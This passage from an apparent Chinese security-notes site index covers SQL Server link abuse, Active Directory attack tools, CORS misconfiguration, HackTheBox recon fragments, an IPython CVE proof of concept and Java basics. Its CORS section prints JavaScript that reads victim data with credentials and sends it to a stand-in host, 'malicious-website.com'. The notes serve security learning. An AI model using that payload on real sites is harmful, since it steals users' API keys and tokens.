Server\u5141\u8bb8\u521b\u5efa\u4e0e\u5176\u4ed6\u6570\u636e\u6e90\u7684\u94fe\u63a5\uff0c\u5982\u5176\u4ed6SQL\u6570\u636e\u5e93\u3002</p> <p>\u6709\u5173\u8fd9\u4e9b\u94fe\u63a5\u7684\u6709\u8da3\u4e4b\u5904\u5728\u4e8e\uff0c\u867d\u7136\u5b83\u4eec\u662f\u7531\u7ba1\u7406\u5458\u4e4b\u7c7b\u7684\u7279\u6743\u7528\u6237\u521b\u5efa\u7684\uff0c\u4f46\u662f\u4efb\u4f55\u7528\u6237\u90fd\u53ef\u4ee5\u4f7f\u7528\u5b83\u4eec\uff0c\u5e76\u4e14\u5141\u8bb8\u4ee5\u94fe\u63a5\u521b\u5efa\u8005\u7684\u6743\u9650\u5728\u8fdc\u7a0b\u673a\u5668\u4e2d\u6267\u884c\u547d\u4ee4\u3002</p> <pre><code>                     `.---.                             .---.                         /   /|         SQL link           /   /|    o                   .---. | ========================= .---. |   /|\\  ---unpriv----&gt;  |   | '  ---------dbadmin------&gt;  |   | '   / \\                  |   |/  ========================= |   |/                         '---'                             '---'                           db1                               db2`\n</code></pre> <p>\u4f7f\u7528dbadmin\u521b\u5efa\u7684\u94fe\u63a5</p> <p>\u6b64\u5916\uff0c\u5982\u679c\u4f60\u559c\u6b22\u901a\u8fc7SQL Server\u8fdb\u884c\u8df3\u8f6c\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528mssqlproxy\u5c06\u5176\u8f6c\u6362\u4e3aSOCKS\u4ee3\u7406\u3002</p> <p>\u5bf9\u4e8e\u66f4\u591a\u6ee5\u7528SQL\u670d\u52a1\u5668\u7684\u65b9\u6cd5\uff0c\u901a\u5e38\u53ef\u4ee5\u501f\u52a9\u4e8ePowerUpSQL\u5de5\u5177\u5305\uff0c\u5f53\u7136\uff0c\u4f60\u5e94\u8be5\u5148\u67e5\u770b\u5176\u7ef4\u57fa\u6587\u6863\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#recommended-resources","title":"Recommended resources","text":"<p>\u5728\u8fd9\u7bc7\u6587\u7ae0\u4e2d\uff0c\u63d0\u4f9b\u4e86\u8bb8\u591a\u8d44\u6e90\u7684\u94fe\u63a5\uff0c\u6211\u4eec\u9f13\u52b1\u5927\u5bb6\u901a\u8fc7\u5b83\u4eec\u5b66\u4e60\u66f4\u591a\u7684\u77e5\u8bc6\u3002\u4f46\u662f\uff0c\u6709\u4e00\u4e9b\u6211\u8ba4\u4e3a\u975e\u5e38\u597d\u7684\u7279\u6b8a\u7ad9\u70b9\uff0c\u5176\u4e2d\u5305\u542b\u5927\u91cf\u5173\u4e8eActive Directory\u7684\u4fe1\u606f\uff1a</p> <p><code>https://docs.microsoft.com/en-us/openspecs/windows_protocols/MS-WINPROTLP/e36c976a-6263-42a8-b119-7a3cc41ddd2a https://adsecurity.org/ https://blog.harmj0y.net/ https://en.hackndo.com/ https://dirkjanm.io/ https://syfuhs.net/ https://www.labofapenetrationtester.com/ https://www.ired.team/</code> </p> <p>\u5b9e\u9645\u4e0a\uff0cActive Directory\u76f8\u5173\u7684\u7f51\u7ad9\u4e0e\u6587\u7ae0\u591a\u5982\u725b\u6bdb\uff0c\u4f46\u4e0a\u9762\u8fd9\u4e9b\u624d\u662f\u6211\u7279\u522b\u76f8\u5173\u7684\uff0c\u56e0\u4e3a\u63cf\u8ff0\u4e86\u8bb8\u591a\u4e3b\u9898\uff0c\u5e76\u4e14\u90fd\u662f\u4e13\u95e8\u9488\u5bf9Active Directory\u7684\u3002</p> <p>\u9664\u4e86\u535a\u5ba2\u4e4b\u5916\uff0c\u8fd9\u91cc\u6211\u8fd8\u4e3a\u60a8\u63d0\u4f9b\u4e86\u4e00\u4e9b\u9762\u5411Active Directory\u7684\u4f18\u79c0\u5de5\u5177\uff0c\u8fd9\u4e9b\u5de5\u5177\u4e0d\u4ec5\u975e\u5e38\u6709\u7528\uff0c\u8fd8\u53ef\u4ee5\u901a\u8fc7\u67e5\u770b\u5176\u4ee3\u7801\u6765\u5b66\u4e60\u5404\u79cdActive Directory\u673a\u5236\u548c\u534f\u8bae\u3002\uff08\u5f53\u7136\uff0c\u8be5\u6e05\u5355\u5e76\u6ca1\u6709\u5217\u51fa\u6240\u6709\u7684\u5de5\u5177\uff0c\u540c\u65f6\u6587\u7ae0\u4e2d\u4e5f\u5217\u51fa\u4e86\u8bb8\u591a\u5176\u4ed6\u7684\u5de5\u5177\uff09\u3002</p> <ul> <li>mimikatz\uff1a\u53ef\u80fd\u662f\u653b\u51fbWindows\u548cActive Directory\u65b9\u9762\u6700\u8457\u540d\u7684\u5de5\u5177\u3002\u5b83\u7528C\u8bed\u8a00\u5b9e\u73b0\u4e86\u4eceWindows\u8ba1\u7b97\u673a\u68c0\u7d22\u51ed\u636e\u4ee5\u53ca\u5728Active Directory\u4e2d\u5192\u5145\u7528\u6237\u7684\u5404\u79cd\u653b\u51fb\u3002</li> <li>impacket\uff1aimpacket\u662f\u7528python\u8bed\u8a00\u7f16\u5199\u7684\u4e00\u4e2a\u5de5\u5177\uff0c\u5b83\u5b9e\u73b0\u6587\u4e2d\u63cf\u8ff0\u7684\u8bb8\u591a\u534f\u8bae\uff0c\u5efa\u8bae\u5927\u5bb6\u4e86\u89e3\u6df1\u5165\u4e86\u89e3\u5176\u5de5\u4f5c\u539f\u7406\u3002\u540c\u65f6\uff0c\u5b83\u8fd8\u63d0\u4f9b\u4e86\u6587\u4e2d\u4ecb\u7ecd\u7684\u90e8\u5206\u653b\u51fb\u793a\u4f8b\u3002</li> <li>responder.py\uff1aResponder\u5141\u8bb8\u60a8\u6267\u884c\u5927\u91cfPitM\u653b\u51fb\uff0c\u6ee5\u7528Windows\u89e3\u6790\u534f\u8bae\uff0c\u5e76\u63d0\u4f9b\u4e86\u8bb8\u591a\u6536\u96c6NTLM\u54c8\u5e0c\u503c\u7684\u534f\u8bae\u670d\u52a1\u5668\u3002\u6211\u4eec\u5efa\u8bae\u5927\u5bb6\u6df1\u5165\u4e86\u89e3\u5176\u5de5\u4f5c\u539f\u7406\u3002</li> <li>Rubeus\uff1aRubeus\u662f\u4e00\u4e2aC#\u5957\u4ef6\uff0c\u7528\u4e8e\u4eceWindows\u8ba1\u7b97\u673a\u6267\u884cKerberos\u653b\u51fb\u3002\u60a8\u53ef\u4ee5\u901a\u8fc7\u5b83\u6765\u4e86\u89e3Kerberos\u7684\u5de5\u4f5c\u539f\u7406\u3002</li> <li>CrackMapExec\uff1aCME\u662f\u4e00\u4e2apython\u5de5\u5177\u3002\u6709\u4e86\u5b83\uff0c\u6211\u4eec\u5c31\u80fd\u8f7b\u677e\u5b8c\u6210\u8fd9\u91cc\u63cf\u8ff0\u7684\u8bb8\u591a\u4e0d\u540c\u7684\u653b\u51fb\u3002</li> <li>BloodHound\uff1aBloodHound\u5141\u8bb8\u60a8\u901a\u8fc7\u5404\u79cd\u4e0d\u540c\u7684LDAP\u8bf7\u6c42\u548c\u5176\u4ed6\u8bf7\u6c42\u6765\u6620\u5c04Active Directory\u7f51\u7edc\u3002\u5982\u679c\u8981\u4e86\u89e3\u6709\u5173Active Directory\u4fa6\u5bdf\u7684\u4fe1\u606f\uff0c\u5efa\u8bae\u6df1\u5165\u8003\u5bdf\u8be5\u5de5\u5177\u3002</li> <li>PowerView\uff1a\u8fd9\u662f\u4e00\u4e2aPowershell\u5de5\u5177\uff0c\u901a\u8fc7\u5b83\u53ef\u4ee5\u53d1\u9001\u5404\u79cdActive Directory\u3001LDAP\u548c\u5176\u4ed6\u534f\u8bae\u65b9\u9762\u7684\u67e5\u8be2\uff0c\u4ee5\u4eceActive Directory\u4e2d\u68c0\u7d22\u5404\u79cd\u4fe1\u606f\u3002</li> <li>Empire\uff1a\u5728Active Directory\u673a\u5668\u4e2d\u90e8\u7f72\u4ee3\u7406\u7684\u5957\u4ef6\uff0c\u53ef\u7528\u6765\u53d1\u52a8\u5404\u79cd\u653b\u51fb\u3002\u6ce8\u610f\uff0cdata/module_source\u76ee\u5f55\u4e2d\u63d0\u4f9b\u4e86\u8bb8\u591a\u5bf9Active directory\u6267\u884c\u4fa6\u5bdf\u548c\u653b\u51fb\u7684\u5de5\u5177\uff0c\u503c\u5f97\u5927\u5bb6\u82b1\u4e9b\u65f6\u95f4\u628a\u73a9\u4e00\u756a\u3002</li> </ul> <p>\u539f\u6587\u5730\u5740\uff1ahttps://zer1t0.gitlab.io/posts/attacking_ad/</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/CORS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/","title":"CORS\u5b89\u5168\u95ee\u9898","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/CORS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#_1","title":"\u524d\u7f6e\u77e5\u8bc6\uff1a","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/CORS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#cross-origin-resource-sharing","title":"\u8de8\u57df\u8d44\u6e90\u5171\u4eab(Cross-origin resource sharing)","text":"<p>\u4f5c\u7528\uff1a\u4f7f\u7528HTTP\u5934\u544a\u8bc9\u6d4f\u89c8\u5668\u51c6\u8bb8\u8bbf\u95ee\u4e0d\u540c\u6e90\u670d\u52a1\u5668\u4e0a\u7684\u6307\u5b9a\u8d44\u6e90\uff0c \u5141\u8bb8\u6d4f\u89c8\u5668\u5411\u8de8\u57df(\u4e0d\u540c\u6e90)\u670d\u52a1\u5668\uff0c\u53d1\u8d77<code>XMLHttpRequest</code>\u8bf7\u6c42\uff0c\u4ece\u800c\u514b\u670dAJAX\u53ea\u80fd\u540c\u6e90\u4f7f\u7528\u7684\u9650\u5236\u3002\u9700\u8981\u6d4f\u89c8\u5668\u548c\u670d\u52a1\u5668\u540c\u65f6\u652f\u6301\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/CORS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#same-origin-policy","title":"\u540c\u6e90\u7b56\u7565(Same-origin policy)","text":"<p>\u7f51\u7edc\u6d4f\u89c8\u5668\u5b89\u5168\u673a\u5236\uff0c\u9632\u6b62\u7f51\u7ad9\u76f8\u4e92\u653b\u51fb\u3002\u9650\u5236\u6e90\u4e0a\u7684\u811a\u672c\u8bbf\u95ee\u53e6\u4e2a\u6e90\u4e0a\u7684\u6570\u636e\u3002\u7531URI\u3001\u534f\u8bae\u3001\u7aef\u53e3\u53f7\u7ec4\u6210\u5355\u4e2a\u6e90\u3002</p> <p>\u540c\u6e90\u7b56\u7565\u53ef\u4ee5\u9650\u5236\u4e0d\u540c\u6e90\u5e94\u7528\u4e4b\u95f4\u7684\u6587\u672c\u6216\u811a\u672c\u4ea4\u4e92\uff0c\u53ef\u7528\u4e8e\u9694\u79bb\u6f5c\u5728\u6076\u610f\u6587\u4ef6\u7684\u91cd\u8981\u5b89\u5168\u673a\u5236\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/CORS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#cors_1","title":"CORS\u6807\u5934\u4ee5\u53ca\u529f\u80fd\u5b9e\u73b0","text":"<p><code>Access-Control-Allow-Origin: *</code> \u6807\u8bc6\u5141\u8bb8\u7684\u8bf7\u6c42\u6765\u6e90\u3002</p> <p>\u5141\u8bb8\u591a\u4e2a\u6765\u6e90\u3001<code>null</code>\u6216\u901a\u914d\u7b26<code>*</code>\u3002\u4f46\u6d4f\u89c8\u5668\u4ec5\u652f\u6301\u5355\u4e2a\uff0c\u5e76\u4e14\u901a\u914d\u7b26<code>*</code>\u4e5f\u4f1a\u53d7\u5230\u9650\u5236\u3002</p> <p><code>*</code>\u4e0d\u80fd\u4e0e\u51ed\u636e\u7684\u8de8\u8d8a\u4f20\u8f93\u7ed3\u5408\u4f7f\u7528\u3002</p> <p>\u9274\u4e8e\u6b64\u9650\u5236\uff0c\u4e00\u4e9bWeb\u670d\u52a1\u5668\u4f1a\u6839\u636e\u5ba2\u6237\u7aef\u6307\u5b9a\u7684\u6765\u6e90\u52a8\u6001\u521b\u5efa\u6807\u5934\uff0c\u8fd9\u662f\u4e0d\u5b89\u5168\u7684\u3002</p> <p><code>Access-Control-Allow-Credentials: true</code> \u5141\u8bb8\u5c06cookie\u6216\u76f8\u5173\u51ed\u636e\u4f20\u9012\u7ed9\u6765\u6e90\u65f6\u8bfb\u53d6\u54cd\u5e94\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/CORS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#_2","title":"\u9884\u68c0\u67e5","text":"<p>\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u5f53\u8de8\u57df\u8bf7\u6c42\u5305\u542b\u975e\u6807\u51c6\u7684 HTTP \u65b9\u6cd5\u6216\u6807\u5934\u65f6\uff0c\u8de8\u57df\u8bf7\u6c42\u4e4b\u524d\u4f1a\u51fa\u73b0\u4f7f\u7528\u8be5<code>OPTIONS</code>\u65b9\u6cd5\u7684\u8bf7\u6c42\uff0c\u5e76\u4e14 CORS \u534f\u8bae\u9700\u8981\u5148\u68c0\u67e5\u5141\u8bb8\u54ea\u4e9b\u65b9\u6cd5\u548c\u6807\u5934\u5141\u8bb8\u8de8\u57df\u8bf7\u6c42\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/CORS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#cors_2","title":"CORS\u5229\u7528","text":"<p>\u914d\u7f6e\u8fc7\u4e8e\u5bbd\u677e\uff0c\u5bfc\u81f4\u53ef\u5229\u7528\u6f0f\u6d1e</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/CORS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#acaoorigin","title":"ACAO\u6807\u5934\u7531\u8bf7\u6c42\u5934Origin\u751f\u6210","text":"<p>\u5bfc\u81f4\u4efb\u4f55\u57df\u5747\u53ef\u8bbf\u95ee\u7ad9\u70b9\u8d44\u6e90,\u5982\u679c\u54cd\u5e94\u5305\u542b\u4efb\u4f55\u654f\u611f\u4fe1\u606f\uff0c\u4f8b\u5982 API \u5bc6\u94a5\u6216CSRF \u4ee4\u724c\uff0c\u60a8\u53ef\u4ee5\u901a\u8fc7\u5728\u60a8\u7684\u7f51\u7ad9\u4e0a\u653e\u7f6e\u4ee5\u4e0b\u811a\u672c\u6765\u68c0\u7d22\u5b83\uff1a</p> <pre><code>var req = new XMLHttpRequest();\nreq.onload = reqListener;\nreq.open('get','https://vulnerable-website.com/sensitive-victim-data',true);\nreq.withCredentials = true;\nreq.send();\n\nfunction reqListener() {\n   location='//malicious-website.com/log?key='+this.responseText;\n};\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/CORS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#origin","title":"Origin\u89e3\u6790\u9519\u8bef","text":"<p>\u5b9e\u65bd CORS \u6e90\u767d\u540d\u5355\u65f6\u7ecf\u5e38\u4f1a\u51fa\u73b0\u9519\u8bef\uff0c\u767d\u540d\u5355\u89c4\u5219\u901a\u5e38\u901a\u8fc7\u5339\u914d URL \u524d\u7f00\u6216\u540e\u7f00\uff0c\u6216\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u6765\u5b9e\u73b0\u3002\u5b9e\u65bd\u4e2d\u7684\u4efb\u4f55\u9519\u8bef\u90fd\u53ef\u80fd\u5bfc\u81f4\u8bbf\u95ee\u88ab\u6388\u4e88\u610f\u5916\u7684\u5916\u90e8\u57df\u3002</p> <pre><code>normal-website.com  //\u4ee5\u4e0b\u7ed3\u5c3e\u57df\u540d\u5141\u8bb8\u8bbf\u95ee\ntestnormal-website.com  //\u7ed5\u8fc7\n\nnormal-website.com  //\u5bf9\u5f53\u524d\u6240\u5728\u57df\u5141\u8bb8\u8bbf\u95ee\nnormal-website.com.test.com     //\u7ed5\u8fc7\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/CORS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#null","title":"\u5217\u5165\u767d\u540d\u5355\u7684 null \u539f\u59cb\u503c","text":"<p>Origin \u6807\u5934\u7684\u89c4\u8303\u652f\u6301 value <code>null</code>\u3002\u6d4f\u89c8\u5668\u53ef\u80fd\u4f1a\u5728\u5404\u79cd\u5f02\u5e38\u60c5\u51b5\u4e0b\u53d1\u9001 Origin \u6807\u5934\u4e2d\u7684\u503c\uff1a</p> <ul> <li>\u8de8\u57df\u91cd\u5b9a\u5411\u3002</li> <li>\u6765\u81ea\u5e8f\u5217\u5316\u6570\u636e\u7684\u8bf7\u6c42\u3002</li> <li><code>file:</code>\u4f7f\u7528\u534f\u8bae \u8bf7\u6c42\u3002</li> <li>\u6c99\u76d2\u5316\u7684\u8de8\u57df\u8bf7\u6c42\u3002</li> </ul> <p>\u67d0\u4e9b\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u5c06<code>null</code>\u6e90\u5217\u5165\u767d\u540d\u5355\u4ee5\u652f\u6301\u5e94\u7528\u7a0b\u5e8f\u7684\u672c\u5730\u5f00\u53d1\u3002\u4f8b\u5982\uff0c\u5047\u8bbe\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u63a5\u6536\u5230\u4ee5\u4e0b\u8de8\u57df\u8bf7\u6c42\uff1a</p> <pre><code>GET /sensitive-victim-data Host: vulnerable-website.com Origin: null\n</code></pre> <p>\u670d\u52a1\u5668\u54cd\u5e94\uff1a</p> <pre><code>HTTP/1.1 200 OK Access-Control-Allow-Origin: null Access-Control-Allow-Credentials: true\n</code></pre> <p><code>null</code>\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u5404\u79cd\u6280\u5de7\u6765\u751f\u6210\u5305\u542bOrigin \u6807\u5934 \u4e2d\u7684\u503c\u7684\u8de8\u57df\u8bf7\u6c42\u3002\u8fd9\u5c06\u6ee1\u8db3\u767d\u540d\u5355\uff0c\u5bfc\u81f4\u8de8\u57df\u8bbf\u95ee\u3002\u4f8b\u5982\uff0c\u8fd9\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b<code>iframe</code>\u5f62\u5f0f\u7684\u6c99\u76d2\u8de8\u57df\u8bf7\u6c42\u6765\u5b8c\u6210\uff1a</p> <pre><code>&lt;iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" src=\"data:text/html,&lt;script&gt;\nvar req = new XMLHttpRequest();\nreq.onload = reqListener;\nreq.open('get','vulnerable-website.com/sensitive-victim-data',true);\nreq.withCredentials = true;\nreq.send();\n\nfunction reqListener() {\nlocation='malicious-website.com/log?key='+this.responseText;\n};\n&lt;/script&gt;\"&gt;&lt;/iframe&gt;\n</code></pre> <p>CORS \u5e38\u89c1\u6f0f\u6d1e\u70b9\uff1a</p> <ul> <li>1.\u4e92\u8054\u7f51\u5382\u5546\u7684api\u63a5\u53e3\uff1b</li> <li>2.\u804a\u5929\u7684\u7a0b\u5e8f\u7684api\u63a5\u53e3\uff1b</li> <li>3.app\u7684api &lt;\u4e0d\u8fc7\u6709\u4e00\u4e9b\u8bf7\u6c42\u9700\u8981\u5e26\u6709\u4e00\u4e9b\u989d\u5916\u7684\u8bf7\u6c42\u5934\uff0c\u5229\u7528\u8d77\u6765\u6bd4\u8f83\u56f0\u96be&gt;;</li> <li>4.\u533a\u5757\u94fe\u5382\u5546\uff1b</li> </ul>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/HTB-Retired/","title":"Retired","text":"<p>nmap -p- --min-rate 10000 [target]</p> <p>\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e</p> <p><code>/index.php?page=default.html</code></p> <p>diff &lt;(curl -s http://target/beta.html) &lt;(curl -s http://target/index.php?page=beta.html)</p> <p>diff \u4ee5\u9010\u884c\u7684\u65b9\u5f0f\uff0c\u6bd4\u8f83\u6587\u672c\u6587\u4ef6\u7684\u5f02\u540c\u5904\u3002\u5982\u679c\u6307\u5b9a\u8981\u6bd4\u8f83\u76ee\u5f55\uff0c\u5219 diff \u4f1a\u6bd4\u8f83\u76ee\u5f55\u4e2d\u76f8\u540c\u6587\u4ef6\u540d\u7684\u6587\u4ef6\uff0c\u4f46\u4e0d\u4f1a\u6bd4\u8f83\u5176\u4e2d\u5b50\u76ee\u5f55\u3002</p> <p>\u76ee\u5f55\u7206\u7834</p> <p>\u5229\u7528\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u63a2\u6d4b\u7f51\u7ad9\u6587\u4ef6</p> <p>feroxbuster -u http://$target -x php,html</p> <p><code>beta.html</code></p> <p>\u9875\u9762\u63d0\u793a\u8bb8\u53ef\u8bc1\u7533\u8bf7</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/HTB-Retired/#webshell","title":"\u83b7\u53d6webshell","text":"<p>\u6587\u4ef6\u8bfb\u53d6</p> <p>poc</p> <p>\u67e5\u770bindex.php\u6e90\u4ee3\u7801</p> <p>\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\u548c\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u7684\u533a\u522b</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/HTB-Talkative/","title":"HTB Talkative","text":"<p>Nmap</p> <pre><code>PORT     STATE    SERVICE VERSION\n22/tcp   filtered ssh\n80/tcp   open     http    Apache httpd 2.4.52\n|_http-generator: Bolt\n|_http-server-header: Apache/2.4.52 (Debian)\n|_http-title: Talkative.htb | Talkative\n3000/tcp open     ppp?\n| fingerprint-strings: \n|   GetRequest: \n|     HTTP/1.1 200 OK\n|     X-XSS-Protection: 1\n|     X-Instance-ID: 7BEhgKZrHjYcyBD4y\n|     Content-Type: text/html; charset=utf-8\n|     Vary: Accept-Encoding\n|     Date: Mon, 22 Aug 2022 16:46:57 GMT\n|     Connection: close\n|     &lt;!DOCTYPE html&gt;\n|     &lt;html&gt;\n|     &lt;head&gt;\n|     &lt;link rel=\"stylesheet\" type=\"text/css\" class=\"__meteor-css__\"\n...[snip]...\n8080/tcp open     http    Tornado httpd 5.0\n|_http-server-header: TornadoServer/5.0\n|_http-title: jamovi\n8081/tcp open     http    Tornado httpd 5.0\n|_http-server-header: TornadoServer/5.0\n|_http-title: 404: Not Found\n8082/tcp open     http    Tornado httpd 5.0\n|_http-server-header: TornadoServer/5.0\n|_http-title: 404: Not Found\n</code></pre> <p>Apache 80,Python WEB \u6846\u67b6 Tornado 8080,8081,8082</p> <p>\u8bbf\u95ee\u7f51\u7ad9\u8df3\u8f6c\u81f3 <code>http://talkative.htb</code></p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Ipython%20exploit/","title":"Ipython exploit","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Ipython%20exploit/#cve-2022-21699-execution-with-unnecessary-privileges-in-ipython","title":"CVE-2022-21699 Execution with Unnecessary Privileges in ipython","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Ipython%20exploit/#affected-versions","title":"Affected versions","text":"<p>&lt; 5.11</p> <p>= 6.0.0, &lt; 7.16.3</p> <p>= 7.17.0, &lt; 7.31.1</p> <p>= 8.0.0, &lt; 8.0.1</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Ipython%20exploit/#patched-versions","title":"Patched versions","text":"<p>5.11</p> <p>7.16.3</p> <p>7.31.1</p> <p>8.0.1</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Ipython%20exploit/#description","title":"Description","text":"<p>\u8be5\u6f0f\u6d1e\u6e90\u4e8e IPython \u5728 CWD \u4e2d\u6267\u884c\u4e0d\u53d7\u4fe1\u4efb\u7684\u6587\u4ef6\u3002\u6b64\u6f0f\u6d1e\u5141\u8bb8\u4e00\u4e2a\u7528\u6237\u4ee5\u53e6\u4e00\u4e2a\u7528\u6237\u7684\u8eab\u4efd\u8fd0\u884c\u4ee3\u7801\u3002</p> <p>Proof of concept</p> <p>User1:</p> <pre><code>mkdir -m 777 /tmp/profile_default\nmkdir -m 777 /tmp/profile_default/startup\necho 'print(\"stealing your private secrets\")' &gt; /tmp/profile_default/startup/foo.py\n</code></pre> <p>User2:</p> <pre><code>cd /tmp\nipython\n</code></pre> <p>User2 will see:</p> <pre><code>Python 3.9.7 (default, Oct 25 2021, 01:04:21)\nType 'copyright', 'credits' or 'license' for more information\nIPython 7.29.0 -- An enhanced Interactive Python. Type '?' for help.\nstealing your private secrets\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Ipython%20exploit/#patched-release-and-documentation","title":"Patched release and documentation","text":"<p>See\u00a0https://ipython.readthedocs.io/en/stable/whatsnew/version8.html#ipython-8-0-1-cve-2022-21699,</p> <p>Version 8.0.1, 7.31.1 for current Python version are recommended. Version 7.16.3 has also been published for Python 3.6 users, Version 5.11 (source only, 5.x branch on github) for older Python versions.</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Ipython%20exploit/#references","title":"References","text":"<ul> <li>GHSA-pq7m-3gw7-gq5x</li> <li>ipython/ipython@46a51ed</li> <li>https://ipython.readthedocs.io/en/stable/whatsnew/version8.html#ipython-8-0-1-cve-2022-21699</li> <li>https://nvd.nist.gov/vuln/detail/CVE-2022-21699</li> <li>https://lists.debian.org/debian-lts-announce/2022/01/msg00021.html</li> <li>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/CRQRTWHYXMLDJ572VGVUZMUPEOTPM3KB/</li> <li>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DZ7LVZBB4D7KVSFNEQUBEHFO3JW6D2ZK/</li> <li></li> </ul>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/JAVA/","title":"JAVA","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/JAVA/#_1","title":"\u6cdb\u578b","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/JAVA/#_2","title":"\u53cd\u5c04","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/JAVA/#type","title":"Type","text":"<p>Type\u662fJava\u8bed\u8a00\u4e2d\u6240\u6709\u7c7b\u578b\u7684\u516c\u5171\u7236\u63a5\u53e3</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/JAVA/#parameterizedtype","title":"ParameterizedType","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/JAVA/#typevariable","title":"TypeVariable","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/JAVA/#genericarraytype","title":"GenericArrayType","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/JAVA/#wildcardtype","title":"WildcardType","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/JDBC/","title":"JDBC","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/JDBC/#jdbc","title":"JDBC","text":"<p>\u4ec0\u4e48\u662fJDBC\uff1fJDBC\u662fJava DataBase Connectivity\u7684\u7f29\u5199\uff0c\u5b83\u662fJava\u7a0b\u5e8f\u8bbf\u95ee\u6570\u636e\u5e93\u7684\u6807\u51c6\u63a5\u53e3\u3002</p> <p>\u4f7f\u7528Java\u7a0b\u5e8f\u8bbf\u95ee\u6570\u636e\u5e93\u65f6\uff0cJava\u4ee3\u7801\u5e76\u4e0d\u662f\u76f4\u63a5\u901a\u8fc7TCP\u8fde\u63a5\u53bb\u8bbf\u95ee\u6570\u636e\u5e93\uff0c\u800c\u662f\u901a\u8fc7JDBC\u63a5\u53e3\u6765\u8bbf\u95ee\uff0c\u800cJDBC\u63a5\u53e3\u5219\u901a\u8fc7JDBC\u9a71\u52a8\u6765\u5b9e\u73b0\u771f\u6b63\u5bf9\u6570\u636e\u5e93\u7684\u8bbf\u95ee\u3002</p> <p>\u4f8b\u5982\uff0c\u6211\u4eec\u5728Java\u4ee3\u7801\u4e2d\u5982\u679c\u8981\u8bbf\u95eeMySQL\uff0c\u90a3\u4e48\u5fc5\u987b\u7f16\u5199\u4ee3\u7801\u64cd\u4f5cJDBC\u63a5\u53e3\u3002\u6ce8\u610f\u5230JDBC\u63a5\u53e3\u662fJava\u6807\u51c6\u5e93\u81ea\u5e26\u7684\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u7f16\u8bd1\u3002\u800c\u5177\u4f53\u7684JDBC\u9a71\u52a8\u662f\u7531\u6570\u636e\u5e93\u5382\u5546\u63d0\u4f9b\u7684\uff0c\u4f8b\u5982\uff0cMySQL\u7684JDBC\u9a71\u52a8\u7531Oracle\u63d0\u4f9b\u3002\u56e0\u6b64\uff0c\u8bbf\u95ee\u67d0\u4e2a\u5177\u4f53\u7684\u6570\u636e\u5e93\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5f15\u5165\u8be5\u5382\u5546\u63d0\u4f9b\u7684JDBC\u9a71\u52a8\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7JDBC\u63a5\u53e3\u6765\u8bbf\u95ee\uff0c\u8fd9\u6837\u4fdd\u8bc1\u4e86Java\u7a0b\u5e8f\u7f16\u5199\u7684\u662f\u4e00\u5957\u6570\u636e\u5e